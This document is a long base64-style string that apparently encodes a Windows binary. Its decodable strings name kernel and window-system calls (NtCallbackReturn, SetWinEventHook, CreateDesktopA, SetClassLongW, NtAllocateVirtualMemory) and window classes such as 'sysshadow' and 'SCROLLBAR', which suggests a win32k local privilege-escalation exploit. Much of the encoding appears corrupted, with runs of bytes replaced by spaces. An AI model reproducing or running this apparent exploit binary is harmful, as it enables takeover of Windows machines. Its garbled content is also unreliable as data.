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CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAwgICAgIDIgIEIgIFAgIFwgIHIgIHogICAgICAgIMaLICDUiyAgICAgIA4gICIgIDIgIEYgIFIgICAgciAgfCAgICAgIGYgIFQgICAgICAgIM6MICAgICAgICAgDiAgICA6ICBOICAgIHIgICAgICAgICAgxI0gINKNICAgICAgBiAgGCAgKCAgOCAgTCAgWiAgbCAgfCAgHiAgICAgIN6KICAgINCKICAgICAgICAEICAcICAqICA6ICAgINCOICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAgICAgICAgICAgIEogIAQgIBQgICAgICAgICAgdiAgcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAwgICAgIDIgIEIgIFAgIFwgIHIgIHogICAgICAgIMaLICDUiyAgICAgIA4gICIgIDIgIEYgIFIgICAgciAgfCAgICAgIGYgIFQgICAgICAgIM6MICAgICAgICAgDiAgICA6ICBOICAgIHIgICAgICAgICAgxI0gINKNICAgICAgBiAgGCAgKCAgOCAgTCAgWiAgbCAgfCAgHiAgICAgIN6KICAgINCKICAgICAgICAEICAcICAqICA6ICAgINCOICAgICAgICAgICAgOQNfc253cHJpbnRmICBeA19zdHJpY21wICBtc3ZjcnQuZGxsICB+A1dhaXRGb3JTaW5nbGVPYmplY3QgUwFHZXRFeGl0Q29kZVRocmVhZCBLA1Rlcm1pbmF0ZVRocmVhZCBsIENyZWF0ZVRocmVhZCAgUgNUbHNTZXRWYWx1ZSAKAkhlYXBGcmVlICA+AUdldEN1cnJlbnRUaHJlYWRJZCAgQgNTbGVlcCAFAkhlYXBBbGxvYyBDA1NsZWVwRXggUQNUbHNHZXRWYWx1ZSBLIENyZWF0ZUV2ZW50QSAgLANTZXRUaHJlYWRBZmZpbml0eU1hc2sgIAJIZWFwQ3JlYXRlICB0A1ZpcnR1YWxQcm90ZWN0ICAfA1NldFByaW9yaXR5Q2xhc3MgIDsBR2V0Q3VycmVudFByb2Nlc3MgMQNTZXRUaHJlYWRQcmlvcml0eSACUmVzdW1lVGhyZWFkICB2AUdldE1vZHVsZUhhbmRsZUEgIE8DVGxzQWxsb2MgIDEgQ2xvc2VIYW5kbGUgAUdldFByb2Nlc3NIZWFwICBQA1Rsc0ZyZWUgRAJMb2FkTGlicmFyeUEgIAFHZXRTeXN0ZW1JbmZvIDUCSXNXb3c2NFByb2Nlc3MgIEtFUk5FTDMyLmRsbCAgAlVuaG9va1dpbkV2ZW50ICB+AlNldFdpbkV2ZW50SG9vayBdIENyZWF0ZU1lbnUgIAECUG9zdFF1aXRNZXNzYWdlIAggQXBwZW5kTWVudUEgRwJTZXRDbGFzc0xvbmdBIGYCU2V0UGFyZW50IDsCU2VuZE1lc3NhZ2VBICACVHJhbnNsYXRlTWVzc2FnZSAgIENyZWF0ZVdpbmRvd0V4QSAgRGVmV2luZG93UHJvY0EgIBYCUmVnaXN0ZXJDbGFzc0EgIAJTZXRNZW51SW5mbyACU2V0V2luZG93TG9uZ0EgICBHZXRDbGFzc0xvbmdBIEgCU2V0Q2xhc3NMb25nVyACU2hvd1dpbmRvdyAgeQJTZXRUaHJlYWREZXNrdG9wICAgR2V0Q2xhc3NOYW1lQSABUG9zdE1lc3NhZ2VBICBDAlNldEFjdGl2ZVdpbmRvdyACU2V0V2luZG93UG9zICAgRGVzdHJveVdpbmRvdyAgRGlzcGF0Y2hNZXNzYWdlQSAgOgFHZXRNZXNzYWdlQSBQIENyZWF0ZURlc2t0b3BBICBDIENsb3NlRGVza3RvcCAgAlN5c3RlbVBhcmFtZXRlcnNJbmZvVyBVU0VSMzIuZGxsICAgTnRGcmVlVmlydHVhbE1lbW9yeSBfIE50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5IGIgTnRDYWxsYmFja1JldHVybiAgAVJ0bEFsbG9jYXRlSGVhcCBHAU50U2V0VGltZXIgIHYCUnRsSW5pdFVuaWNvZGVTdHJpbmcgIEACUnRsRnJlZUhlYXAgIE50Q3JlYXRlVGltZXIgaAJSdGxHZXRWZXJzaW9uIG50ZGxsLmRsbCABUnBjU3RyaW5nRnJlZUEgIAFVdWlkVG9TdHJpbmdBIFJQQ1JUNC5kbGwgIARtZW1jcHkgIARtZW1zZXQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUCAgICAgIDo6Ojo6Ojo6Ojo6OiAgICAgICMxNzFLMV8xczExMTExMTExMmwyMjI1M3gzKTRcNDQ0NDQhNTw1WzVqNTU1NTU1NTU1NQM2EzY1NkI2TzZcNmk2dzY2NjYDNxE3JjdRN3Y3Nzc3IDk9OTk5ETosOks6dDp8Ojo6Ojo6OjoFOwo7Gjs0O0E7Sjs7ajt7Ozs7Ozs7OwU8HzxOPFo8PHA8PDw8PDwOPRY9MT1nPXs9PTw+Tj52Pj4+BD97Pz8gcCAgeAEgID0wMAkxHTEnMS0xSDFQMVsxbjF1MTExMTEvMj0yaDJyMjIyMjIyMjAzSzNVM18zdzN+MzMzMzMDNEI0XDQ0NDQCNSo1MDVJNWU1azU1NQE2EzY/Nn82NjY2NjYgNxk3fTc3Nzc3NwE4Vjg4ODg4EjknOS05RzlSOXQ5OTk5OTk5OTk5OTk5OTk5OTk5OQE6IDoROhc6Jjo6OkU6UzpcOm86eTo6Ojo6Ojo6BjstOzI7ODs9O0M7UDttOzs7Ozs7AjwgPBU8HjwzPEc8UzxpPHI8ezw8PDw8PDw8PDw8PU09Xj1vPT09PT09Bj4UPho+JD45Pk4+Wz4+Pj4+Pj4KPxM/Gj8iPy8/Pz9IPz8/Pz8/Pz8gICAgICAgICAwDzAZMCgwMjA9MEcwXjBoMHMwfTAwMDAwMBYxSjFsMTExMTExMTExMTMzBjQgNCk0PTQ0NDQ0NDQ0NAU1CjURNRc1MTU3NUE1ZDVqNXA1djV8NTU1NTU1NTU1NTU1NTU1NTU1NTU1NSA2BjYMNhI2GDYeNiQ2KjYwNjY2PDZCNkg2TjZUNlo2NmY2bDZyNng2fjY2NjY2NjY2NjY2NjY2NjY2NjY2NjYCNyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBZBUxVU1ZXM2Q1MCAgIHYMdhxGCH4gNmY5Txh1fwwzdeyNtQEgIAEgIAEgICACICBQUFBZcTxcCBgVICAgWXcgICBTEFgDTApzHHRedCQwQ3gsdFB8JDhAKANEJDRQBHQQdCQ8UAg7VCQ8dyEPMmZmIHQPZg8DMAN8JDABPgLZi8KLdCQ4K1QkNDtyU0N4CHRaA0cMdE8DUAEgIHQ9RCQw3oN/BCB1BQNfEAIDHwp0JCAgIHQFSiMETA4CUXQkNAEgIAME1oMUW1czM3QKPGF8AiwKA19WV1NRTCQ8cTxUAXh0XANUJDxaIAMkPEoYMwN0JDw7dCAEOEIYciQDdCQ8UgIgICBaAzNmCHocM9K7BCAgIANEJDwDx4sgA0QkPAIzWVtfXsOLyK09dAh3ICAgICAgICB2RnoaICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUSIgICAgICAgICAgICAgECAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIBwpICB4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAgIBwDICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCAgIAIgICAmICAgAiAgICAgICAgICAgICAgICAgICAgICAgICAiICAgICggICAIICAgKCAgICAgICAgICAgICAgQCAgQCAgICAgICAgHAMgICAwICAgBCAgIDAgICAgICAgICAgICAgIEAgIEIgICAgICAgICAgICAgICAgICAgICAgID8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTVEFUSUMgIEdsb2JhbFwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgAiAgIAgRIBAmIBADICAgESAQJiAQCiAgIE0QIBAmIBAoICAgJBAgECYgECAgCiAPIBAmIBAgIAwgDyAQJiAQICAgICAgICBzeXNzaGFkb3cgICBtc2N0ZmltZSB1aSBTQ1JPTExCQVIgICBcIEIgYSBzIGUgTiBhIG0gZSBkIE8gYiBqIGUgYyB0IHMgXCAlIFMgICAgICBkIFAgICA4IGwgICAgZCBQICAgOCBsICAgKiBkIFAgICA4IGwgICAyIGwgVCAoIEAgbCAgIDIgbCBYICggQCB4ICggICAgICAgICAgIB8SQxFdEREyEi8geAEgICggRCABQiBQIB8SQxFdEREyEjAgeAEgICggRCABQiBQIB8SQxFdEREyEjAgeAEgICggRCABQiBQIB8SQxFdEREyEjAgeAEgICggRCABQiBQIBsSQhFcEREuEjAgeAEgICggRCABQiBQIBsSQhFcEREuEjAgeAEgICggOCABQiBQIBsSQhFcEREuEjAgeAEgICggOCABQiBQIDUSTRFoERFKEjEgICB4IEggBAJCIFAgNRJNEWgREUoSMSAgIHggSCAEAkIgUCA1Ek0RaBERShIyICAgeCBIIAQCQiBQIDUSTRFoERFKEjEgICB4IEggBAJCIFAgNRJNEWgREUoSMSAgIHggSCAEAkIgUCA1Ek0RaBERShIyICAgeCBIIAQCQiBQIEESThFtERFWEjIgICB4IFAgJAJBIE4gQRJOEW0REVYSMiAgIHggUCAkAkEgTiA3El0RPREKEh4SNCAgIHQgIAwCQyBQIDoSXxE/EQ4SIRI2ICAgdCAgX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